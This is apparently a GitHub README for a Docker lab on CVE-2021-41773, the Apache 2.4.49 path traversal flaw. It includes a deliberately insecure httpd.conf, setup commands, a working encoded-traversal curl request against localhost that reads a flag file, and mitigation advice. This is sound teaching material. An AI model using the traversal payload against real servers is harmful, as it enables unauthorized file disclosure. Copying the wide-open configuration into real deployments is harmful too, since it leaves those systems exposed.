# 🛡️ CVE-2021-41773: Apache Path Traversal Vulnerability Demonstration

> Demonstration of CVE-2021-41773 using Docker, simulating real-world misconfiguration and sensitive data exposure.

## 🧠 About This Vulnerability

- **CVE ID**: CVE-2021-41773  
- **Component**: Apache HTTP Server 2.4.49  
- **Vulnerability Type**: Path Traversal / Directory Traversal  
- **Severity**: High  
- **Exploitability**: Public exploit available  
- **Impact**: Unauthorized file disclosure, potential RCE if CGI is enabled  

## ⚠️ What Causes This?

Apache 2.4.49 introduced a regression in URL path normalization. When combined with CGI support and misconfigured directory access (`<Directory /> Require all granted`), attackers could:

- Traverse directories using encoded sequences like `.%2e/`
- Access sensitive files outside the document root
- Potentially execute arbitrary code if CGI is enabled (extended in CVE-2021-42013)

## 📂 Real-World Impact

- Stealing of `.env` files, `/etc/passwd`, AWS credentials
- Disclosure of source code or private keys
- Full compromise via arbitrary code execution

## 🐳 Lab Setup with Docker

This lab demonstrates the vulnerability using Docker. It mimics a misconfigured Apache server running version 2.4.49 with CGI enabled.

### 📁 Directory Structure

```
project/
├── Dockerfile
├── cgi-bin/
│   └── test.sh
└── flag.txt
```

### ⚙️ httpd.conf

Use the default Apache config with these changes:

```apache
LoadModule cgid_module modules/mod_cgid.so
ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride All
    Options +ExecCGI +Indexes +FollowSymLinks
    Require all granted
</Directory>

<Directory />
    AllowOverride All
    Require all granted
    Options +Indexes +FollowSymLinks
</Directory>
```


### 🏴 flag.txt

```
FLAG{apache_path_traversal_demo_successful}
```

---

## 🚀 Running the Lab

### Step 1: Build the Docker image

```bash
docker build -t apache-vuln .
```

### Step 2: Run the vulnerable container

```bash
docker run -d -p 8080:80 --name apache-cve \
  -v %cd%/cgi-bin:/usr/local/apache2/cgi-bin \
  apache-vuln
```

📌 **Note for Windows users**: You must run this in `Git Bash` or WSL to avoid volume mounting errors.

---

## 🎯 Exploiting the Vulnerability

### 🛠️ Normal Access

```bash
curl http://localhost:8080/cgi-bin/test.sh
```

Should output:

```html
<html><body><h1>CGI Works!</h1></body></html>
```

### 🚨 Directory Traversal

```bash
curl -v --path-as-is "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/flag.txt"
```

✅ You should see the contents of `flag.txt` despite it being outside the web root.

---

## 🛡️ Mitigation

- **Upgrade** to Apache 2.4.51 or later
- Avoid setting `Require all granted` on root (`<Directory />`)
- Disable CGI unless absolutely necessary
- Use `AllowOverride None` to prevent unexpected .htaccess overrides

---

## 🧾 References

- [Apache Security Advisory](https://httpd.apache.org/security/vulnerabilities_24.html)
- [MITRE CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
- [Rapid7 Analysis](https://www.rapid7.com/blog/post/2021/10/05/cve-2021-41773-apache-httpd-path-traversal-vulnerability/)

---

## 📌 Disclaimer

> This PoC is for **educational and awareness purposes** only. All tests were conducted in an isolated lab environment. Never attempt unauthorized testing on live systems.

---

## ✍️ Author

Gautam ([@magicgautam](https://github.com/yourgithub))  
Security Researcher | Cloud Analyst | Learner

